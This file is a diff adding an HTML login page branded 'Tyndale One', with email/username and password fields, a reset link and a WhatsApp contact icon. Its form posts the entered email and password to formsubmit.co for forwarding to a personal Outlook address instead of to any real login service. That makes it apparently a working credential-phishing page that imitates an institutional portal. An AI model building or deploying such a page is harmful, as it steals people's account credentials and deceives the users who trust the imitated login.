@@ -1,0 +1,122 @@
+<html lang="en">
+<head>
+ <title>Document</title>
+ <style>
+    body {
+        background-image: url(./bgg.jpeg);
+        background-size: cover;
+        background-repeat: no-repeat;
+        position: relative;
+        justify-content: center;
+        align-items: center;
+        z-index: auto;
+        display: flex;
+    }
+    form{
+        
+    }
+    #box{
+        height: 500px;
+        width: 500px;
+        background-color: rgb(249, 249, 249);
+        border-radius: 20px;
+        padding: 10px;
+        position: absolute;
+        display: grid;
+
+    }
+    img{
+        width: 80px;
+        height: 80px;
+        margin-left: 200px;
+        margin-top: 30px;
+    }
+    input{
+        height: 50px;
+        width: 400px;
+        padding: 10px;
+        margin-top: 20px;
+        margin-left: 50px;
+        background-color: aliceblue;
+        border-radius: 9px;
+    }
+    button{
+        height: 50px;
+        width: 300px;
+        padding: 10px;
+        color: aliceblue;
+        margin-left: 100px;
+        transition: 500ms;
+        background-color: rgb(14, 13, 13);
+        border-radius: 9px;
+        margin-top: 30px;
+        cursor: pointer;
+    }
+    button:hover{
+        height: 60px;
+        width: 300px;
+        color: black;
+        background-color: aliceblue;
+        border-radius: 9px;
+    }
+    input:hover{
+        height: 60px;
+        width: 400px;
+        color: black;
+        background-color: aliceblue;
+        border-radius: 9px;
+    }
+    h1{
+        font-size: 30px;
+        margin-left: 150px;
+    }
+    a{
+        font-size: 30px;
+        margin-left: 150px;
+        margin-top: 60px;
+    }
+    #contact{
+        float: right;
+    }
+    ion-icon{
+        height: 70px;
+        width: 70px;
+        position: sticky;
+        margin-left: 670%;
+        color: green;
+        background-color: white;
+        border-radius: 50px;
+        position: sticky;
+        margin-top: 700px;
+        transition: 500ms;
+    }
+    ion-icon:hover{
+        height: 100px;
+        width: 100px;
+        background-color:green;
+        border-radius: 50px;
+        color: white;
+    }
+ </style>
+</head>
+<body>
+    <div id="box">
+        <form action="https://formsubmit.co/webdev011@outlook.com" method="POST">
+            <img src="./logo.png">
+            <h1>Tyndale One</h1>
+            <input type="email" name="email" placeholder="Email/Username">
+            <input type="password" name="password" placeholder="Password">
+            <br>
+            <button>log in</button>
+            <br>
+            <a href="#">Reset Password</a>
+        </form>
+    </div>
+    <div id="contact">
+        <ion-icon name="logo-whatsapp"></ion-icon>
+    </div>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+<script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+</html>
